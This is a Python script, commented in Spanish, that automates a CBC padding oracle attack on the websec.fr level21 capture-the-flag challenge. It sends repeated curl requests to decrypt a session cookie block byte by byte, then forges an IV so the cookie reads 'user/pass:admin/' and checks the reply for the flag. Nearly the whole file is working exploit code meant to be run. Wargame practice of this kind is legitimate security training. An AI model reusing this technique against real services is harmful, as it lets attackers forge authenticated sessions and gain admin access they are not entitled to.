#!/usr/bin/env python3
import binascii
import subprocess
import sys
import time

request_count = 0

def oracle_test(cookie_hex):
    global request_count
    request_count += 1
    
    if request_count % 50 == 0:
        print(f" [{request_count} reqs]", end='', flush=True)
    
    cmd = f'curl -s https://websec.fr/level21/index.php --cookie "session={cookie_hex}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    # Oracle: True si NO está corrupto
    return "corrupted" not in result.stdout.lower()

def decrypt_block_intermediate(ct_block_hex):
    """Descifra el valor intermedio D(K, CT_block)"""
    intermediate = bytearray(16)
    
    print("Descifrando intermedio byte por byte:\n")
    
    for pad_val in range(1, 17):
        pos = 16 - pad_val
        print(f"  Byte {pos:2d}...", end='', flush=True)
        
        found = False
        for guess in range(256):
            test_iv = bytearray(16)
            
            # Bytes ya conocidos con padding correcto
            for k in range(1, pad_val):
                test_iv[16 - k] = intermediate[16 - k] ^ pad_val
            
            test_iv[pos] = guess
            
            test_cookie = binascii.hexlify(test_iv).decode() + ct_block_hex
            
            if oracle_test(test_cookie):
                intermediate[pos] = guess ^ pad_val
                print(f" 0x{intermediate[pos]:02x}", end='')
                found = True
                break
        
        if not found:
            print(f" FAIL")
            return None
        print("")
    
    return bytes(intermediate)

# Cookie truncada de testxx
cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e53"

ct_block1_hex = cookie[32:64]

print("=== PADDING ORACLE ATTACK COMPLETO ===\n")
print(f"Descifrando bloque 1...")
print(f"CT: {ct_block1_hex}\n")

start = time.time()

intermediate = decrypt_block_intermediate(ct_block1_hex)

elapsed = time.time() - start

if intermediate:
    print(f"\n✓ Intermedio: {binascii.hexlify(intermediate).decode()}")
    print(f"  Tiempo: {elapsed/60:.1f} min, Requests: {request_count}")
    
    # Ahora que tengo el intermedio, puedo crear cualquier plaintext
    # Quiero: "user/pass:admin/"
    
    target = b"user/pass:admin/"
    if len(target) < 16:
        target = target + b'\x00' * (16 - len(target))
    
    # IV = intermedio XOR plaintext_deseado
    iv_needed = bytearray(16)
    for i in range(16):
        iv_needed[i] = intermediate[i] ^ target[i]
    
    # Cookie final con solo 1 bloque
    cookie_final = binascii.hexlify(iv_needed).decode() + ct_block1_hex
    
    print(f"\nCookie final: {cookie_final}")
    print(f"Probando...\n")
    
    cmd = f'curl -s https://websec.fr/level21/index.php --cookie "session={cookie_final}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    import re
    flag_match = re.search(r'WEBSEC\{[^}]+\}', result.stdout)
    if flag_match:
        print(f"★★★★★ FLAG: {flag_match.group(0)} ★★★★★")
    elif "Hello admin" in result.stdout:
        print("★★★ Hello admin!")
        for line in result.stdout.split('\n'):
            if 'flag' in line.lower():
                print(line)
    else:
        print(f"Status: {'Corrupted' if 'corrupted' in result.stdout else ('Wrong' if 'Wrong' in result.stdout else 'Otro')}")
else:
    print(f"\n✗ Fallo. Requests: {request_count}, Tiempo: {elapsed/60:.1f} min")

